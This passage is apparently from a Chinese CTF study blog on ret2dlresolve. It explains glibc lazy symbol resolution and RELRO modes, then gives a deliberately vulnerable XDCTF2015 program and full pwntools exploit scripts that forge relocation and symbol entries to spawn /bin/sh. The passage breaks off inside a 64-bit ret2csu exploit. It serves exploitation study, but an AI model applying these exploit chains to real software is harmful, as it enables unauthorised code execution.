href="https://blogs.oracle.com/solaris/post/gnu-hash-elf-sections">GNU_hash</a>)</p><ol><li><p>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</p></li><li><p><code>.rel.plt</code> + 第二个参数求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作reloc</p></li><li><p><code>reloc-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作sym</p></li><li><p><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</p></li><li><p>如果sym-&gt;st_other非零(一般都是), 则执行下面的流程. </p></li><li><p>查找符号对应的版本信息, 版本信息数组在l_info里, 使用<code>VERSYMIDX (DT_VERSYM)</code>宏进行定位, 仍然利用重定位条目中的符号表编号作为versnum索引, 取出结构体地址, 然后访问version-&gt;hash, 如果符号表下标设置的太大则访问hash时可能会超出内存映射范围导致segment fault. 如果version被置NULL, 解析也能通过. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> =</span> <span class="hljs-literal">NULL</span>;<br>   <br><span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)<br>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Half)</span> *vernum </span>= (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;<br>    version = &amp;l-&gt;l_versions[ndx];<br>    <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)<br>        version = <span class="hljs-literal">NULL</span>;<br>&#125;<br>   <br>result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>                              version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br>   <br>value = sym ? (LOOKUP_VALUE_ADDRESS (result)<br>               + sym-&gt;st_value) : <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>否则由于st_other描述符号的可见性，如果包含STV_PROTECTED、STV_HIDDEN和STV_INTERNAL的其中任何一种，则直接将装载地址加上st_value即得到函数的最终地址value，将其写入rel_addr即可。</p></li><li><p>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</p></li><li><p>调用这个函数</p></li></ol><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><blockquote><ul><li>No RELRO - Link Map、GOT 可写, <code>.dynamic</code>可写</li><li>Partial RELRO - Link Map 不可写、GOT 可写, <code>.dynamic</code>不可写 </li><li>Full RELRO - 全不可写</li></ul></blockquote><p>分成四种情况:</p><ul><li>32, No RELRO</li><li>32, Patial RELRO</li><li>64, No RELRO</li><li>64, Patial RELRO</li></ul><p>下面每一种都分成手动和工具两部分:</p><p>示例代码源码, 非常简单的栈溢出. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];<br>    setbuf(<span class="hljs-built_in">stdin</span>, buf);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">256</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;<br><br>    setbuf(<span class="hljs-built_in">stdout</span>, buf);<br>    write(<span class="hljs-number">1</span>, buf, <span class="hljs-built_in">strlen</span>(buf));<br>    vuln();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="32-No-RELRO"><a href="#32-No-RELRO" class="headerlink" title="32, No RELRO"></a>32, No RELRO</h4><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">gcc -fno-stack-protector -m32 -z norelro -no-pie pwn5.c -o norelro_32<br></code></pre></div></td></tr></table></figure><p>在这种情况下，修改 <code>.dynamic</code> 会简单些。因为我们只需要修改 <code>.dynamic</code> 节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下</p><ol><li>修改 .dynamic 节中字符串表的地址为伪造的地址</li><li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li><li>在特定的位置读取 /bin/sh 字符串。</li><li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而执行 system 函数。</li></ol><h4 id="32-Partial-RELRO"><a href="#32-Partial-RELRO" class="headerlink" title="32, Partial RELRO"></a>32, Partial RELRO</h4><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie pwn5.c -o partial_relro_32<br></code></pre></div></td></tr></table></figure><p>这个时候.dynamic不可写, 于是我们需要构造整个需要的信息链条, 而: (再写一遍加深印象)</p><ol><li>dlresolve函数第二个参数表示重定位条目在.rel.plt中的偏移</li><li>.rel.plt中有符号在.dyntab中的索引</li><li>.dyntab有符号名称在.dynstr中的偏移</li><li>利用偏移找到符号名字符串, 然后利用名称找到其地址(解析所要做的事情), 找到后修改GOT条目, 然后调用此函数</li></ol><p>从而得知需要一步步构造1-3所表示的链条. 下面每个stage模仿Wiki.</p><ol><li>首先实现栈转移. 利用原本的plt机制执行write函数</li><li>在上一个基础上, 手动找到write在.rel.plt中的偏移, 压入栈当做参数, 直接调用位于plt0的dlresolve()</li><li>在上一个基础上, 在bss段伪造.rel.plt项(即<code>Elf32_Rel</code>), 内容和真实的write重定位项相同, 然后把参数改成<code>.rel.plt</code>到这一个项的偏移. </li><li>在上一个基础上, 重定位项内容info符号表偏移改成在bss段中, 顺便伪造一下符号表 <del>和符号名称字符串</del>.<br>但是只做这些<mark>有可能</mark>导致version-&gt;hash超出内存范围. 而在动态解析符号地址的过程中，<strong>如果 version 为 NULL 的话，也会正常解析符号。</strong>与此同时, 可以知道 l_versions 的前两个元素中的 hash 值都为 0，因此如果我们使得 ndx 为 0 或者 1 时，就可以满足要求.<br>由于符号地址查找使用的宏<code>DL_FIXUP_MAKE_VALUE</code>需要使用符号所在的linkmap加上符号偏移找到其地址, libc函数自然就需要libc中的linkmap, 所以只能进入if语句尝试绕过version-&gt;hash的访问以及version的比对.<br>在本地kali2022环境下ndx正好是0, 无需担心. </li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary = elf = ELF(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = process(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br>rop = ROP(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br><br>offset = <span class="hljs-number">112</span><br>bss_addr = elf.bss()<br><br>r.recvuntil(<span class="hljs-string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)<br><br><span class="hljs-comment"># stack privot to bss segment, set esp = base_stage</span><br>base = bss_addr + <span class="hljs-number">0x800</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span>)<br>rop.read(<span class="hljs-number">0</span>, base, <span class="hljs-number">100</span>)<br>rop.migrate(base)<br>r.sendline(rop.chain())<br><br>rop = ROP(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br>sh = <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br><br>plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br><br>fake_sym_addr = base + <span class="hljs-number">32</span><br>align_addend = <span class="hljs-number">0x10</span> - (fake_sym_addr - dynsym) &amp; <span class="hljs-number">0xf</span><br>fake_sym_addr += align_addend<br><span class="hljs-comment"># first arg is the offset by fake_dynstr table in rop chain</span><br>fake_write_sym = flat([<span class="hljs-number">0x42</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x12</span>])<br><br>rel_r_offset = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>dynsym_idx = <span class="hljs-built_in">int</span>((fake_sym_addr - dynsym) / <span class="hljs-number">0x10</span>)<br>rel_r_info = (dynsym_idx &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x07</span><br>fake_write_reloc = flat([rel_r_offset, rel_r_info])<br>rel_offset = base + <span class="hljs-number">24</span> - rel_plt<br><br>gnu_version_addr = elf.get_section_by_name(<span class="hljs-string">&#x27;.gnu.version&#x27;</span>).header.sh_addr<br>log.success(<span class="hljs-string">&quot;ndx_addr: %s&quot;</span> % <span class="hljs-built_in">hex</span>(gnu_version_addr+dynsym_idx*<span class="hljs-number">2</span>))<br><br>sh = <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br>rop.raw(plt)<br>rop.raw(rel_offset)<br>rop.raw(<span class="hljs-string">&#x27;bbbb&#x27;</span>)  <span class="hljs-comment"># fake ret address of write</span><br>rop.raw(<span class="hljs-number">1</span>)<br>rop.raw(base + <span class="hljs-number">80</span>)<br>rop.raw(<span class="hljs-built_in">len</span>(sh))<br><span class="hljs-comment"># base + 24</span><br>rop.raw(fake_write_reloc)<br><span class="hljs-comment"># base + 32</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*align_addend)<br>rop.raw(fake_write_sym)<br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>rop.raw(sh)<br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br><br><br>gdb.attach(r)<br>r.sendline(rop.chain())<br>r.interactive()<br></code></pre></div></td></tr></table></figure><ol start="5"><li>我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary = elf = ELF(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = process(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br>rop = ROP(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br><br>offset = <span class="hljs-number">112</span><br>bss_addr = elf.bss()<br><br>r.recvuntil(<span class="hljs-string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)<br><br><span class="hljs-comment"># stack privot to bss segment, set esp = base_stage</span><br>base = bss_addr + <span class="hljs-number">0x800</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span>)<br>rop.read(<span class="hljs-number">0</span>, base, <span class="hljs-number">100</span>)<br>rop.migrate(base)<br>r.sendline(rop.chain())<br><br>rop = ROP(<span class="hljs-string">&#x27;./partial_relro_32&#x27;</span>)<br>sh = <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br><br>plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br><br>fake_sym_addr = base + <span class="hljs-number">32</span><br>align_addend = <span class="hljs-number">0x10</span> - (fake_sym_addr - dynsym) &amp; <span class="hljs-number">0xf</span><br>fake_sym_addr += align_addend<br>st_name = fake_sym_addr + <span class="hljs-number">0x10</span> - dynstr<br><span class="hljs-comment"># first arg is the offset by fake_dynstr table in rop chain</span><br>fake_write_sym = flat([st_name, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x12</span>])<br><br>rel_r_offset = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>dynsym_idx = <span class="hljs-built_in">int</span>((fake_sym_addr - dynsym) / <span class="hljs-number">0x10</span>)<br>rel_r_info = (dynsym_idx &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x07</span><br>fake_write_reloc = flat([rel_r_offset, rel_r_info])<br>rel_offset = base + <span class="hljs-number">24</span> - rel_plt<br><br>gnu_version_addr = elf.get_section_by_name(<span class="hljs-string">&#x27;.gnu.version&#x27;</span>).header.sh_addr<br>log.success(<span class="hljs-string">&quot;ndx_addr: %s&quot;</span> % <span class="hljs-built_in">hex</span>(gnu_version_addr+dynsym_idx*<span class="hljs-number">2</span>))<br><br>sh = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br>rop.raw(plt)<br>rop.raw(rel_offset)<br>rop.raw(<span class="hljs-string">&#x27;bbbb&#x27;</span>)  <span class="hljs-comment"># fake ret address of write</span><br><span class="hljs-comment"># rop.raw(1)</span><br>rop.raw(base + <span class="hljs-number">80</span>)<br><span class="hljs-comment"># rop.raw(len(sh))</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">24</span>-<span class="hljs-built_in">len</span>(rop.chain())))<br><span class="hljs-comment"># base + 24</span><br>rop.raw(fake_write_reloc)<br><span class="hljs-comment"># base + 32</span><br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span>*align_addend)<br>rop.raw(fake_write_sym)<br>rop.raw(<span class="hljs-string">b&#x27;system\x00&#x27;</span>)<br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span> * (<span class="hljs-number">80</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>rop.raw(sh)<br>rop.raw(<span class="hljs-string">b&#x27;b&#x27;</span> * (<span class="hljs-number">100</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br><br><br><span class="hljs-comment"># gdb.attach(r)</span><br>r.sendline(rop.chain())<br>r.interactive()<br></code></pre></div></td></tr></table></figure><p>基于工具</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary = elf = ELF(<span class="hljs-string">&quot;./main_partial_relro_32&quot;</span>)<br>rop = ROP(context.binary)<br>dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="hljs-string">&quot;system&quot;</span>,args=[<span class="hljs-string">&quot;/bin/sh&quot;</span>])<br><span class="hljs-comment"># pwntools will help us choose a proper addr</span><br><span class="hljs-comment"># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span><br>rop.read(<span class="hljs-number">0</span>,dlresolve.data_addr)<br>rop.ret2dlresolve(dlresolve)<br>raw_rop = rop.chain()<br>io = process(<span class="hljs-string">&quot;./main_partial_relro_32&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)<br>payload = flat(&#123;<span class="hljs-number">112</span>:raw_rop,<span class="hljs-number">256</span>:dlresolve.payload&#125;)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h4 id="64-No-RELRO"><a href="#64-No-RELRO" class="headerlink" title="64, No RELRO"></a>64, No RELRO</h4><p>在这种情况下，类似于 32 位的情况直接构造即可。由于可以溢出的缓冲区太少，所以我们可以考虑进行栈迁移后，然后进行漏洞利用。</p><ol><li>在 bss 段伪造栈。栈中的数据为<ol><li>修改 .dynamic 节中字符串表的地址为伪造的地址</li><li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li><li>在特定的位置读取 /bin/sh 字符串。</li><li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而触发执行 system 函数。</li></ol></li><li>栈迁移到 bss 段。</li></ol><p>程序中没有直接设置rdx的gadget, 所以使用了<code>__libc_csu_init</code> 中的一堆gadget, 借用了ret2csu. </p><p>自己写又遇到一堆问题….</p><ul><li>csu_call里面把0x10写成0x16..</li><li>一开始还把伪造的dynstr和sh写在第二个rop链的中间, 调试了一会儿才发现自己有多离谱. </li><li>然后在system函数中的xmm指令出错, 原因是xmmword关键字要求<code>rsp+0x40</code>16字节对齐, 于是将base增加8字节. </li></ul><blockquote><p>MOVAPS—Move Aligned Packed Single-Precision Floating-Point Values</p><p><strong>XMMWORD</strong> is intended to represent the same type as m128.<br><strong>Variables of type</strong>  <code>__m128</code> are automatically aligned on 16-byte boundaries.</p></blockquote><ul><li>csu_call中加入rbp的设置, 原因是第一次read限制256字节, 一个csu_call加上120字节填充已经240, <code>rop.migrate()</code>已经不可用(过长), 只好利用csu_call结束时pop的rbp, 然后跟上一个leave_ret就可以继续利用, 如果不需要则函数中rbp为默认值0. </li><li>然后又发现rbp直接填成base的值是不行的, leave指令的执行顺序是<code>mov rsp, rbp; pop rbp</code>, 所以rsp成功修改为rbp的值后马上加上0x8, 所以传入的rbp值应为期望rsp值减去8. </li><li>多次使用read, 注意sendline附加的换行符和read的字节数长度. </li><li>chlibc之后没想到<code>.dynamic</code>的地址都会改变, 调试了半天不知道为什么解析不成功, 然后直接在_dl_fixup中的linkmap参数查出STRTAB的地址才发现不一样了.</li><li>还有一个问题是csu使用的call的操作数是内存数值, 所以不能传入要执行的指令的地址, 这里是先把它存在fake_stack上, 然后计算出他的地址, 再将地址作为csu_call的参数, 可以说传入的是<strong>一个指针的地址</strong>. </li></ul><p>exp如下, 不同编译运行环境下需要更改的是: </p><ul><li>csu_front csu_end csu使用的寄存器 </li><li>dyn_STRTAB_entry地址. </li><li>read_plt也就是plt中第二条指令的地址. </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-built_in">bin</span> = <span class="hljs-string">&#x27;./norelro_64&#x27;</span><br>context.binary = elf = ELF(<span class="hljs-built_in">bin</span>)<br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br>p = process(<span class="hljs-built_in">bin</span>)<br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br><br>csu_front = <span class="hljs-number">0x401298</span><br>csu_end = <span class="hljs-number">0x4012b2</span><br><span class="hljs-comment"># will take place 0x38+0x38+0x8=0x78 or 120 bytes space</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">csu_call</span>(<span class="hljs-params">pointer, edi, rsi, rdx, rsp=<span class="hljs-number">0</span></span>):</span><br>    <span class="hljs-comment"># rdi = edi = r12d</span><br>    <span class="hljs-comment"># rsi = r13</span><br>    <span class="hljs-comment"># rdx = r14</span><br>    <span class="hljs-comment"># rbx = 0, rbp = 1</span><br>    <span class="hljs-comment"># pop sequence: rbx rbp r12 r13 r14 r15</span><br>    payload = pack(csu_end)<br>    payload += flat([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, edi, rsi, rdx, pointer, csu_front])<br>    payload += flat([<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>, rsp-<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x38</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x8</span>)])<br>    <span class="hljs-keyword">return</span> payload<br><br>dyn_STRTAB_entry = <span class="hljs-number">0x3ff3e0</span><br>bss = elf.get_section_by_name(<span class="hljs-string">&#x27;.bss&#x27;</span>).header.sh_addr<br>stack_size = <span class="hljs-number">0x200</span><br>base = bss + stack_size + <span class="hljs-number">0x8</span><br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;base = 0x%x&#x27;</span> % base)<br><br>rop = ROP(<span class="hljs-built_in">bin</span>)<br>rop.raw(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">120</span>)<br>rop.raw(csu_call(read_got, <span class="hljs-number">0</span>, base, <span class="hljs-number">277</span>, rsp=base))<br>rop.raw(<span class="hljs-number">0x40118b</span>)   <span class="hljs-comment"># leave; ret;</span><br>rop.raw(<span class="hljs-string">&#x27;b&#x27;</span> * (<span class="hljs-number">256</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br>log.success(<span class="hljs-string">f&#x27;migrate rop len: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(rop.chain())&#125;</span>&#x27;</span>)<br>ss(rop.chain())<br><br>rop = ROP(<span class="hljs-built_in">bin</span>)<br>rop.raw(csu_call(read_got, <span class="hljs-number">0</span>, dyn_STRTAB_entry+<span class="hljs-number">8</span>, <span class="hljs-number">8</span>))<br>log.success(<span class="hljs-string">&#x27;entry address: 0x%x&#x27;</span> % dyn_STRTAB_entry)<br><span class="hljs-comment"># base+269=rop.raw(read_plt) base+261=rop.raw(sh)</span><br>rop.raw(csu_call(base + <span class="hljs-number">269</span>, base + <span class="hljs-number">261</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br><br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).data()<br>dynstr = dynstr[:dynstr.find(<span class="hljs-string">b&#x27;read&#x27;</span>)+<span class="hljs-number">5</span>].replace(<span class="hljs-string">b&#x27;read&#x27;</span>, <span class="hljs-string">b&#x27;system&#x27;</span>)<br>log.success(<span class="hljs-string">f&#x27;dynstr is: <span class="hljs-subst">&#123;dynstr&#125;</span>&#x27;</span>)<br>rop.raw(dynstr)<br><span class="hljs-comment"># log.error(str(len(rop.chain())))</span><br>sh = <span 